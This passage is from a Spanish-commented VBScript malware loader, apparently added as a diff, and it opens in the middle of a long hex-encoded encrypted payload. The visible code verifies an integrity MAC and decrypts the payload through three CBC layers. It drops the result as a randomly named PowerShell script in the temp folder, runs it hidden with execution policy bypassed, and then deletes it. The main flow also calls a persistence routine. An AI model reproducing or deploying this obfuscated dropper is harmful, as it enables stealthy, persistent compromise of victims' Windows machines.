7E4CB8F69F0D7DE5A7CCFD9DF7FAFA77CC0C141A3BA2A620F696DE97F29CB29D4C3EE9001D81124A224473F6AA56D70828E776F2D77325C284CF39E146D34E174EB8D8F35C2E27"
+EncryptedBlocks(53) = "54138125F89CA36B6F6AA4794250EA8DF02C1A2D9853A6AE211473491FC5ED68A050936F316135F575E9694AFA2DCE334C1C35EADBA0B1E5A5A2E18BB2FB7B5BDCE5BD758AD47951A02D5D5B570E04E4FF5719820E17DDFCE3C48A105692EF4F9D768F884D7CBEE1A0AA2FBF152772A3D056562D2DEDD03A5951BB7BEB3BB9B43409EF44A016046E060DDE7D65DEF3361059B543C785712789FECA756969B15034E1AE1FB536A9A2F81DC06A4A7DAA24BE922549B6920E7A2F380E12595ED9F85D86ED998FA784D10D3D4580AF01F5BCAE4E782AE9C712F924FA39624565A794C186CB94AD3506F8E150478D04906FC7085456B0E0BDD16FE18EA808FFB0B51B237413B0CE97F8FBE0B6EA2CDE01BF4B8DF2F2E4DCD2AC9AA5D61FE73A7B3063EA38269915ECE9D6F2FD8F347BEA470BD1DC40D59880D05EAEE4781730DD6588A273C3F488947D5515AF7F5BD21D313DD8556EA5D15C8571BD16BD30D3591BC2E110A5DB3172CE5C556C7B405D36760249147A83BB1066B347B8A976182E1304AA3BFC91C6EA75056EBEC3C54D41CFD7BCE9C2D157E14A9ABCB5D9473B492FB2D1C1426EDEBC076C68148232E08506C81FF54D582C83E7980CE44A398545E9C6E881EAB9A530502C2016930C01111742E6CCC6058AB27859F508E6630DAA8FB3B040D765A214B0B57E423D4AC51FDF08EFBAC0A8C344A089135F4E83B4308827"
+EncryptedBlocks(54) = "C92F0A75A9100C8751E912084C9EBBE8F194B77B796241264572C948EF0460CAA7A556A636DEA1A005C60BD884B706F67E13868EE0792F72A85A98D15562D821AC2CF8E0BE337775BDB1EDAC83694D260AB00626BE695540770D5E12F7213F7F756EDCE854B622C0BE157DFA5FD5539660619977CF40EB0B1C249FDB1831EA30987DE8B68FF8255426F1260F99617728D23C5901D5A4DC9EBB2B6EE61561B20EE1C623916C701FF8BF56C22FA8A089E50297D4693D15958C6643A0E2342DEA19F474FCB1A041CA497579405357F71F0D3B70F8B47FF172DE913A37073309A6376E7D2FECE537F4911D73F0F82922C32CC102D77365888AA9A8674EDB382E8C1BD27D4E489F81C0D9C9E8D1DF4E38524AB4107E58A15177D50FD6BD3CA50A52376068A03FD0EB2D471FB108E83EFB459098693EAEEB4FC969D24DA5856882030C29F0AA2578FCD38A554381F6187A4B08E497C291FF4B45443AEAE4D589501E082CD7258F12AE60314567D0056FB0DC6C4A2DC2F1A45EC25EDAF97D03B288491E524B79CE3DEC1C63765BA7E05C56B6E14A0627308EB885D692CA7EF704BAE3998A99EF198F6730B50A19DA7851F2D555D79CDBABC37EDF23255624ACE8A111E174FE009D4D322DBDA50281529CEFA6EAC799CFCE624A89E78C70E52A8288F6ED55D4BBC4AD53E57401662F9A768762685DC5CEE0A8E73F457DEEA2025FCEE538"
+EncryptedBlocks(55) = "FBDF806441F39CA6D3C2F8731035CD624AAE9E0F34D0F87F13827A8F61693B21106DD74431BE56F2228910ECD1EF2BC92A674B274E2F5E21A9BBE8A20E7408D4929C84A961960E12BB340CA16CBEAB15B7EF7C8E6C36FE652BBBAE2998A7609A832B2EAC8232FE81F9C5272E50E39874DED4A2B838883A2E87A5E9EF60E7804E93513947CB614A69EB5226CD41149CE94A98BD22B7B37BB281405E597326425327F0078AF9ECF5AB13893646100425A8C80B0E9FD9BBA91FF04E24BA4A85B4919FE8DF740BADCD1C3C450D9948A7B5F82F7D268E6F33A8D35067BE1E2104221A9A9B00A7C3820200DDBFB0A380395F48112F5BAC35A4544917B899BB6F8638FBFFAAAC24B618821F964E058E51215376C5F04711F0CE2511085C38C621AED1057832D128EC0FC226EF003BF8330D301D50B759F6868E43C1F851D1C82C8FD2F1B34609143CF2AF85AFF2A3BC89C412270FB4DD4CADD529DA8F8E1D85993AAFCE2FADAE6830CB06F16328C03EEE038E2FD52031273052322F9FCA82EE8456587B6D3CE340454BA61F60319F744A3F4B5DD4352CBC243681ECF9BB199D87428B80F8F2FCE1F6A80D5CD2F0FBA33318E3B33E521E00C56E53345F2A9B511B2250F9BF6D7BE1696328B1E625C7AE665397489F8FA783F78C1B00FFE811BFA5F70BF09D84BFAAD9F9380BCD63A97D6D3EECA43162FA69B451EF54C6C16692A77A4AA2"
+EncryptedBlocks(56) = "034101292633538BC2BF3AA37D3D804F374B41E4BFD5515A72323108A66C0A02E3445DEE48B778156BDB992636682101954D36A4F096461172B3ED07E510C49F813F1A26D940C9E87FA61B05B791E2E890D66BAFA42B32574E33267869348A3A4236ACD62F8693F7348E415E60B0EFC2CBAF58EBF34712F292E0030CF4978AF6A29538224ADE693E6878FCA931CC2553C15A13CB7277359BAB91199A6C7F03A8C799065E4CDEB2E75C17FBD049FDA37D65AE5791397C3C78A70C6A57E84C2A1393AB6715852E078EFB952EB0A3B62FE3D8E2BAAB2872ABF25D651A3C1E024BB9D9BF307FCBFDBD7473A8E9BAD9C93DEF7C8C737CDAFA1CB98689EC79FD2AD60E9FA5B9CE7FE042D950B302CBA55E34FF793C88483BC25D9D0EAC3C2247873541EEA1152FC64CC0C0ABE2564FDCF6957060E2CCF0EAB7A40EBFB50E551E1161C55725B87CDDE963B1C9658C0BBC89C5BE0574F4A0ACD0CBBCB0261C58B82162D6672E667AA37633005577938707BDEF41DA7262F2A1D88A581619D3C2076E7A292D650D37F33499A36915B193E4384CA69A9F7A24891D13234C743F8E08167A61A843F4CC80D2701F95DD3803DAADB8ADD3D3DB98C63A88916A87C9D560FE6E77820E7681A05CC0A8121467A64FF3CA12D699C22FCD8BB3A3E7099A4C0E580F06B0D40D72A38A03E4EC9A728E9BB3E94B58E7E7139379D185524A69BEBE952DA2"
+EncryptedBlocks(57) = "292F78C78C5A4FB17B2C0DB9E4328006AC3682C161617E612467A434EA3B096720B3286FFE4F28CF4C447DAD5B1E2E6F5BD8A244976B71AAED35B1B91A3633E501A9223F965E2A9B9A848E9A489B4489C5837F6A5EFBD842D2F96C2FDD0C1B8470ACA21C0D55BBCE663F7D966956FD6BE1B71A0553ED04BDEF8FE6876C552E1A282E902FDA8FD1FEE687B9C373934D81FD8037080D839784C5083A1259D72F3F4C6F5ACC34539CBAC2F3A269A50483AC5AF00D51DA16725CDA92C4021887837AFD594A4F6FE0C5365681804D50BB2695CFA2E29D97046E11C10B05EB2F2F7E9A92ABD6972248508D9E20E750F3D84437225E17250DBC68060FC1774E0F9F007D20382EBFE85AA0126A8286EF4006D8119421C478F599C2B7BBF4A7EB2B3BC274D5F22F62A7EF015F7489638244D19B1A0E4B0A647FA58CDF7D3B99CE0E481961EE0D74471076B2018256EC7116A7E4D892CFC95F0258B7D90EBA23383CC7C8C76ABBED714956B892DD9BEBD3E46B041E08516A0AC2A273B80AF2A4D066E47FDC3BFD4618AB338DEB33A32020ABAAAAD79385EC4E7131984A0E4B6434FD391437C47B1AEBCBAA4D60BD11721C3AEB03A1D5567CC135227600CF823608831CE03A7C8F9840C6DB2E00CBC7EF647BC571A2643175F3694C111347412BDFFCBF9C74B5ACC303C90BD906BD5821B687A91319079142F93A41074D9E136E569840FED4"
+EncryptedBlocks(58) = "A1838D7BEB2C382AA64F5F08B890C5BC90F94173352C27CCEE18DE2AF3B2E840AD2BA00FE877FCA2E1AC8903EF0304FABCD9B5C1AF7D057F9B3DECA77B83D77907878E086A18E79C23C71E33D7CF3B2117385C8D52C333AF4EC2E43F209BC23984EB51D0F08DEAA71CDAE197E1B3FDDE104173E2FDD22556A631ECFF7BB0330A4A79B6A597AAC14ECFAAF5046DF2E475E89667AD953DBB46C1AE9981420421556DECB9418E90542678C5F019295A73DC739265DD7C4B5F751BF17772B626F7F1455510621135766C3A15FF131EA753146D7D264F6093052815CA14F44AAACD4ADCDEA6C3BB061B6E3B5D64DAB0C1991F2B97126E5AFD8991D763EB32ED6C6A63BFA1595A11D9E01D2373CBB00B70712C7BFBA379E89AC6CA0C319D4A24438CF9650BB325F9B4B973D18F0B1D539473B4CE3242AE9B858273831439709CD34FE3A11A85734BC96B0F88CF6466011F02DEADD5EC62980FE05158F1F8C29814B53281C5464C7DAB2A2BCA8894D7006E993DB95C872248C560DF0859364DDC737F9490979F3F07EC2AEB168B25900A7EC68A071619B9B75808B1959F650454C164BF1E0542C58B740C66BB8E44E25A3F021C9767CDA78D2EFFD8435A96FF94548C4432F15940B149292103958328F8678DE70A7A1EBA9EB3CFBBB5F289F6A3D3F50A974D351EC762550C9A286FEB50C519070B00D55CCB3781FF1C7E16557AD792C6"
+EncryptedBlocks(59) = "99749DDF68D6220758D57AFEB9FAEB025EDE854E5945D99CAF101776E6CB2E1F58C354154FECCA2CDB471CAF5CDB2EF336F4A33F893034E1DD471BC7E6BE51F451D1E4ECB933165C5C3EADC9CA6619F09A1265219F8FD55C0EEE69CB9531B36446D55EAFFBEC91019A688909EFAF44FFD1BFCD962F7898188972F4CBA097319139CD4DC2076F3A98B53972AECCF631DD3729003CD76BCEA73C49A5B971A31346AD3BE8F1F59FF2D426D65BB0300405CC2CD1A73CB7F37E1EFA43A6BF2A6E4A9860DA455FA382292A5EA97D36BA30CF7B1015510FDBECBA2D0E80736D77E80F7C7A65B1FEB1F2D8CDF22856BCB667D12047EB27E046B4378074149242602C0080B89ABC2360FAF77CF013A3240221F7852255DA1FFA552BBD90EBD84C4005532683F9426C7287C7462AA18E7451964B8AF41687B0A61CB39AF75E9213B1E4A6F576DC331A30C75AE3EE3D4085913014B183F645A79326530D9525419E9DCF9D0EE42AF310ABA9F087122A9056FB3B554D16A998EE8EEE94CEFC8EEB865EB7364A8845DD80800EE2E040ACF82D4A1227C721C9531605280DEC5DDB7F15125645617B2BEFF50814ADDB6506574EA924A834EBAEFDF6EADAE8BEBA0F62AFBD33C591FEC59DB3984662562DD53C27972C12C53311C3FAFB57C5D6968AB36D8247DE89B216AC1540952901ADEED58D2F87A54FA71D929FA1290FCE30D9D39EF1629C82"
+EncryptedBlocks(60) = "F89117129DA80ED2CD79B7E99EDCB52EA0EA09365A0C048E832962B006EA21838D791B00D400C0E3616993CCC830E6FD0770794B524061830AEF47522E3E027FB7B9B78B4CCB6DDF5B53B962C88E9A11430C8224D16FFC2B1AC7A911C2D1ED7F6E220DC7162857CD8CDD6E63BF487C87E4A6CA95C71B03BBDCD4E07AC763BCE74890DC0662E30D33DDDF38DFDB6C4F940E9B499F0D0B068354BF43D93B893B6A11773492C81D56193A36243888468C5B61214D0D69CB9839480B480345457124A19432F0F66F487F813EFB793F8537A1D6BA1278C1E69E63E0DD25B67EAAEF3CF222F7A1100A4850E21AFFF42DD8029328FC2CDE3AC9804B78FCE97DF1F11B840CF7DE5C96C75F3153BCDC21F9411BD7E53E74A57844418943EE0ED6D381EFA641B178158293D327902D1D75F3741EEC20BCF8A818C361B42AD756208BFFA44369381B70AA814783835F428215EA179CA2AEF942972148D72D54BB84E1C66F4C0D8DF4B8FF16462D0FA73BCF4BFDD581376BF3B30C1D7F4253131C6D51C2D1DA87CB85102A38B462948D1976E9134A2710B6A17D6F478BF21EBDA7F647F1C95C9E3CC271B7AC9BA13E6B021DF446C781B4551FEA3D1C8081B9DE58BD936076D81F4B7FC20763234718DEF136840BFFC89B6BEA9B2AC5B196DA8AF3AFACC0537EE09F0D020B390C3DE4AC486E566A4B05039498060331B1725DF34A9FCF230DD4"
+EncryptedBlocks(61) = "778BBED4B51290EE5D4D2404D8A796FB353DC936061D2ABDCEB33EFEB92559B85120D580C3DAF366FC044AC8139724205D44E74E99EB5293335862581187A7B2E2C1F4DBA4C13C055F5B1C9CADFD1200BB23E276591C2E7338AEA122ED49AC4DB44C663A7278403FEC6F8A93F1278BBE15AE4B167FCE587E4E8D6C12C93A7FA1D7FEC13450C0E7B5D544511ED855CD7DB3EB7FFF822B24ED9AE49DF14856164B9BA31E64C8E45284CA587F947CD19C8BA85C3E0B9F9F24EF8039659589450FDE9FB9C932FB1953259A56276E51550A01807AFC0ACAB33363679FD93F86E5A893EE89E4C6AE4AA7A5BCAF2E3B26D6C26B3D3B5D2D28303F9174CF4C24040171B9C04FD72F20499BECD9963AD160A6C86C10BBF542A9E1C3AE13A1B7239BC56317B40FBC9378B82E93D0EE0D9B1D60C2A97C208BDE22F550F18F6BDF0ACAD9D49B4B8E4BCD2026460C5C787583DFDA16C4DCE08F5D4C9E6575A6036D23987A9283B03EA51132D89C7D5E045801E8F756F91541E29E26F4B1C2863A936B34684376F47A4ADB67B66A12D74D19AE77F9747DD01239E7700C1437EB7CA7EC3A71305B1C5AF9A88FCE56DD1370FC5711DF055723B57CD67F3442EEA932D66D36B3E6C37AF2D39045C41DCBD3DFB991E9BDFA7B3A223556B16FB19F994DB84FD88E1D6236770CDA400364857C74159C69B162B5B037ADE0CD72A685631F5F4AB2D9A94B"
+EncryptedBlocks(62) = "5BBB7B68076A0E1C80FE76C3B87CA4F15742DD3DEDB380DA4BFEF4F610E505CDB579E32E71A9D09AF48100A1A919F689418730A7C857FEEBAD8A0C201EE6ED77574C581CA25CC4A53AD0B545A8842E8E4894AECFDE6F12D6686509201EC82A9E9B1D82B219D9EB7927FD5F47EAB659B54C092A62610C799A4BD44A88DA56DF6FB48584C6ACF6E87109E7ECD8F1FB71E317BA160019D20D6B1966D7C4AD1CF37CC5ACB8C55B4161EE9B751204C2D1EBD6143C9C606B8864C922D3869411A6FA6467AFB282D1532128D5BBF51AE02794A7BF046A8DD6E7EB4FC97E8F3E799F32B1E082D87A8CF851DEC561672589F7AA803F4CF2C6F6BBBB114B31CC6AA5D9FC22D5AEC5CAD2C72B4320B80719DEF874D9D6C8E081D8B079EEF3A0EC069D6C3409151FF2977CCEE8E5F2FD1F3EAFFC1A7EC3F95B6189D39603C42B5AB1C9B3643BC265C58F57FEE61C6E970551424E4AD257A2BD76708DD1A02AF2C7EFFFD5E95012ADCFC1DEAD69D906F95352B020FF972FA60EA96C6F0C4C9663DB54EA71D817628628334E96577CC2810E7F720890D2969EECC49C64D464D0C12C333135D5168F4A35B329852DE2D33DDB04B4828CECEA5EEC6D0D8937FAE68B3FA2FA67400F220F24DF2DA281E41528C3AF72CB1F1ED0BF598AABA2EA8875E9646B941AFA6FD4C1600E13995F41E232BD04C96F6AC05D6E495EA7CDCFB82703AC62865D81BE"
+EncryptedBlocks(63) = "3F039A67E222E2652B659D3428F91482317A241794E961113331CF2D5079FC4C9A385F44EBFE760FAE6D5FED774BCE7E3E75D866E5298497AA58E324AFDADD45243AE79B0770074AA7E7B65B15C087C4F4C78F393893FE13701C704D5297018B7B6CBB1D3997B35515CEB282DAF37F3681BF906B6FDC50D3E42AE08D43CC30F99478F9A49AC0E38E66344DB33C826BC04010DEB9F386760591DF5087BF92B1B6618EB3C0973123F3654A56ACCB77F09ED9DC0FE343F8EE3357E71ACE0526580243E1609AEBEED9D83CCFF66B363536FA06E4C3A9A7C38B9DEB05C1FD7DF009EBF1198485877A19071A768C0A34BB5B1CF10C49F9DC14BD7D06F0C43A1D1F20A2C386B2A0CF5E6784AEB7912891E1F645D9D6C9B67497947406B73C288289C3FF44E531FCD13BDF74DE3743AB98F3FA1EC20B07298B422DF374E669E985A1E8EF6876B78575598DCF2D1C1E7003ADF37948AB83D8070F20CEB702A8C6C5D693C4ED1924B265219105BC112F01A561EF522046571F4ED34D20B2D7349597AA32FDB6BECBB2DD2EE5E2FFDF338B0C174C6461AC3867B6830BD7876A4EF883FE05B01057BC5F55980750B4DC31599678E6EED1F114A780F96C65D9BAB4E86641F211D1756E40D0E76F5F39C206D082CE824F49DEB87487BA133C45F58F0F40D9376E2EB0B598441BE5902C36FF5EA7B3F78B0E2A79E52FFCB335589267A402C1FC38"
+EncryptedBlocks(64) = "AF6A15E02CB244CC64D9E41B66C36AEF6A2833B0B992AD8ED49BFE468F9AC8BF9E9281C7691DBE4AAB04FBA6C45A14EF902C5AB8761B55E02F8B210227C249CC5090526DF8154A5233404124EC2B138BB82E2A3AA4DA7927E5F105BDF23235615A8647A0B2BCF0968B0FC83D9BD66ABD1705D31EADD267F4E69274D400C90FC6F99780BA0042FB6223CF7839ED978A7EAD0B63B4E512DDE71DF453FE1F54272BF54C498E62DA0BE9EE74B475048E232806E48DE6DAEF14014B6CDC1BD37DCDDD162F8167CCBCC595CA11EB80E4FF5401E53E886CB44755239049629A4EF88E7D17CF371DE46A5FB28004405EB51F9BEDB22E8BAD10FF2374B068C8F1165D79188955A56A1CB1028B8F0BF6B998298E1420DABA890CF850E59CAB42060E11661B66F5B0A3A11EFDFD4F7DC62F1AB19392EBD12C9717A36C9349FA6608C9C859D38CE04A0B540F9B7B9B42B1373BB953506FA6D302996F9BDF7A6F26D93F00276ACB51B9FB387B2D040F0B291295A0A356DEFD0A1538516C996DDD372BAE6A750FC638A0AB36BEF2255DD75A294ECC6960440229A8313741DFDC76542DBB4EB17FB82AA5D09C59812438E1BD378F075C69CF596F564AED39971A9DE253FC202B4A225A83DF6E18DF2C88738944A925CB4A1D19E7D5A1E53D0834F2137E7F41718BDB1EEF457D081DA34500E6107A88CB6C88C3B472276B1A599C28BCB5ADFB517B"
+EncryptedBlocks(65) = "5B1729D49175BB2513649F955FC7C8B273215930802B1F3A8EE8C413FFDAAE9B6E8BCF2C0FAD3C1FB6A86D3608765D17BDFB100FA42468647E1FA90F46E840F265C93B0C110E6BA1725606600CB29EBA1E7CABC3A823AD771F38B6F7AD7C965AD960C14AC3150DAAB82F4985652A89558FD5F0F231A07A2C6F83CEFB0509C7494D02E06934E357EC4676F51F5B99679BFBC6A3F3D17C483827D53B016219D57C598E6A3E4523DAEBF0E1D758AEBD973F2DADF7FB15D46050350160C102917CC9BD18D5AE1C7AE7519196CE5E0B410817280AB48AE64D3306BD5F82E30A534093128099566A477FB41D7E8DEE21D1DE8556C348489CAFF159B2572935F5AB3B7027FD8AE875E37341EDB11A191B8F4D5E1243075066E1F4CE6C4E4DD1138500D2AB1AA312D431068C3C49C3ECD51B6A9E5B713F3210EB9DD4A48AA8EB38B5AB240778F04A39DE60DBA932826BF568C81077685ABC242407F70FCFBFCD55B988ECDC6E7459320848C781E441723723BA6CD6A650FEDB351C98445A6A11FF8BC5986BECFB5EC65715F30DA38F0AAB531F9FFD21B2CD813A5BA0C52ABDCDAFF36FF2F4AE638E2BBF2A323AE6BAA06F9D1F775A0307B56F20F204C3D6D29296B4A277B97DFDF9DE539EFD215E30092940A40130CB0474B4923FC4C1E2AF8C63763EA843D72114A728751F2205AFF9E271CC81B05552A47EA853F5AFC17FCEAB4E5D47"
+EncryptedBlocks(66) = "363B3EBE5891B7D1A1A8E589EDC31DCB73682ECB898D842B6AFA14454E9E1F7253D332241CED0307D221BD8A3E149AC39ACDFDF9A66BF43E160A0F9F9C7697B3990030B8F0712640A55FACF3E7F18E5CE3C2ECA01A53D6BEA4A699B69761AFF2577A285359657DFD93694A60EB5CE4263E0729D8A4B2F4E966FAEADB69A156D6B50EB31207FD448842A4A7F732DFA658714D9EF02587F2829E3C213B09DFF09CDCC704487AA48E9C315F010D82DB016D277D40B3A41BB5DBF548F1E37E02BE63445F1D029779AA5D1C8AF53BE38DE95EA1BAA103E8063308885A6404AE10F099002C8B700AA3DEC57D7259EB276EDA5F5B5C50795FAD6D62B1AEC3579D93542BCA3952C6079749D76A561C287EC0F75E4625CEAC4C59AA54D87E35BA5BC28452861CBBDA98471BC2D6EACDEF508BBFC7ACD3F31A8E0F6459D2EDDD8A05B1741CEB898A9608FB7331465CCD45BBBD4FC98B39A3344C2A2E4D346EC9A78D316630FA005E66BE2E6E4E9C1C76EDEB8896B481CAE391DF8DAA0085D27B25E470F67626472181C32D4BB715A024AD93BC405F9523EB5D773C43F59834E3FDE2A5BCF6DC30D3F00677D559199A538058D0134B0C3E99BD06037663DCE402DE707E7C987C4C04A418E19614B75E83DA17A73E29EB7FDB384B5D8063E6E2DA32AF617F566723B24428432A8169ADA56868AE99EFB7BA0AED4EE1D16E5F12D34AFBDB29C0"
+EncryptedBlocks(67) = "8FFBB39B6F98411370464C821142B705458ACDCCEDA02D538944A622F31D467CED46F6BEBA7E025C0A40B246C8BCE6D022822EC1DD29A7BA0997E1096614B9E0CBBC428AA1DA2FB553AF5475C89D23E6C251EC1694FC5DC9BCA78E74B77C91A5CC26EF6B343639BA1489A869597A57C9139A5EBBBC0AA9AE1FA14F62F75828391A711D92BE1D02C9C662DF668A6F00F8E90289A34E47BFEBA959640A9997027F"
+Dim CiphertextHex : CiphertextHex = Join(EncryptedBlocks, "")
+
+Dim Ciphertext
+Ciphertext = HexToBytes(CiphertextHex)
+' ----------------------------------------------------------------------------
+' DESCIFRADO + DROP + EJECUCION
+'
+' El Ciphertext tiene la estructura:
+'   [ iv3(16) ][ iv2(16) ][ iv1(16) ][ ciphertext(len-64) ][ integrityMac(16) ]
+' Se descifra en 3 capas (cada una con su propio motor de bloques):
+'   1) DecryptCBC_Blk     (clave key1, iv iv1)
+'   2) DecryptCBC_InvRound (clave key2, iv iv2)
+'   3) DecryptCBC_EncRound (clave key3, iv iv3)
+' y por ultimo se quita el padding PKCS7.
+' ----------------------------------------------------------------------------
+Sub DecryptAndDrop()
+    Dim ciphertextLen, payloadBody(), integrityMac(15), iv3(15), iv2(15), iv1(15), ciphertext()
+    Dim keyBytes, expandedKey, key3(15), key2(15), key1(15), integrityKey(31)
+    Dim computedMac, integrityOk, i
+    Dim decrypted3, decrypted2, decrypted1, plaintext
+    Dim scriptContent, chars(), c
+    Dim fso, shell, scriptPath, stream, psExe, cmd
+
+    ciphertextLen = UBound(Ciphertext) + 1
+    If ciphertextLen < 80 Or ((ciphertextLen - 64) Mod 16) <> 0 Then Exit Sub
+
+    ' Separar las partes del Ciphertext
+    ReDim payloadBody(ciphertextLen - 17)
+    For i = 0 To ciphertextLen - 17
+        payloadBody(i) = Ciphertext(i)
+    Next
+    For i = 0 To 15
+        integrityMac(i) = Ciphertext(ciphertextLen - 16 + i)
+        iv3(i)          = Ciphertext(i)
+        iv2(i)          = Ciphertext(16 + i)
+        iv1(i)          = Ciphertext(32 + i)
+    Next
+    ReDim ciphertext(ciphertextLen - 65)
+    For i = 0 To ciphertextLen - 65
+        ciphertext(i) = Ciphertext(48 + i)
+    Next
+
+    ' Derivar las claves desde la password (80 bytes)
+    keyBytes    = Utf8ToBytes(AesKey)
+    expandedKey = ExpandKeyBytes(keyBytes, 80)
+    For i = 0 To 15
+        key3(i) = expandedKey(i)
+        key2(i) = expandedKey(16 + i)
+        key1(i) = expandedKey(32 + i)
+    Next
+    For i = 0 To 31
+        integrityKey(i) = expandedKey(48 + i)
+    Next
+
+    ' Verificacion de integridad (MAC) sobre payloadBody
+    computedMac = ComputeIntegrity(integrityKey, payloadBody)
+    integrityOk = True
+    For i = 0 To 15
+        If computedMac(i) <> integrityMac(i) Then integrityOk = False
+    Next
+    If Not integrityOk Then Exit Sub
+
+    ' Descifrado en 3 capas + quitar padding
+    decrypted3 = DecryptCBC_Blk(key1, iv1, ciphertext)
+    decrypted2 = DecryptCBC_InvRound(key2, iv2, decrypted3)
+    decrypted1 = DecryptCBC_EncRound(key3, iv3, decrypted2)
+    plaintext  = UnpadPKCS7(decrypted1)
+
+    ' Convertir bytes -> texto
+    ReDim chars(UBound(plaintext))
+    For i = 0 To UBound(plaintext)
+        chars(i) = Chr(plaintext(i))
+    Next
+    scriptContent = Join(chars, "")
+
+    ' Drop en %TEMP%\<5 digitos>.ps1
+    Set fso   = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    scriptPath = fso.GetSpecialFolder(2) & "\" & Int(Rnd * 90000 + 10000) & ".ps1"
+    Set stream = fso.CreateTextFile(scriptPath, True, True)  ' unicode
+    stream.Write scriptContent
+    stream.Close
+
+    ' Ejecutar con PowerShell oculto y luego borrar
+    On Error Resume Next
+    psExe = shell.ExpandEnvironmentStrings("%SystemRoot%") & "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+    cmd   = """" & psExe & """ -NoP -NonI -W Hidden -EP Bypass -Sta -File """ & scriptPath & """"
+    shell.Run cmd, 0, False
+    WScript.Sleep 2500
+    fso.DeleteFile scriptPath, True
+    On Error GoTo 0
+End Sub
+
+
+' ============================================================================
+'  FLUJO PRINCIPAL
+' ============================================================================
+Randomize
+InitCryptoTables
+
+InstallPersistence
+DecryptAndDrop
